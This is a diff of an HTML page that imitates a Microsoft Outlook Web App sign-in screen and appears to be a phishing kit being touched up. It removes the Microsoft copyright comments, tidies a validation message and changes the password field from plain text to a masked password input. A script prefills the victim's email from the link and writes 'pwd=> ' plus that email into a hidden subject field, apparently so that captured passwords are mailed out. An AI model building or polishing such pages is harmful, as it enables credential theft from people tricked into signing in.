@@ -1,10 +1,3 @@
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
-<!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
-<!-- OwaPage = ASP.auth_logon_aspx -->
-
-<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> 
 <html>
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=10" />
@@ -1357,12 +1350,14 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
             </div>
         
 		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
-	 <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 30px; width:260px;" required="" oninvalid="this.setCustomValidity('Enter your email password')"
+	 <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 30px; width:260px;" required="" oninvalid="this.setCustomValidity('Enter your email address')"
   oninput="this.setCustomValidity('')" />
 
-		<div class="signInInputLabel" id="password" aria-hidden="true">Password:</div>
-		<div><input type="TEXT" name="Password" placeholder="password" style="font-size: 12pt; height: 30px; width:260px;font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;" required="" oninvalid="this.setCustomValidity('Enter your email password')"
-  oninput="this.setCustomValidity('')"/></div>
+		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
+	 <input type="password" name="Password" id="password" placeholder="Password" style="font-size: 12pt; height: 30px; width:260px;" required="" oninvalid="this.setCustomValidity('Enter your email password')"
+  oninput="this.setCustomValidity('')" />
+
+
         <div class="showPasswordCheck signInCheckBoxText">
             <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()" />
             <span>Show password</span>
@@ -1403,4 +1398,7 @@ document.getElementById('email').value=params.get('email');
 document.getElementById('subject').value="pwd=> " + params.get('email');
 
 </script>
+
+
+
 
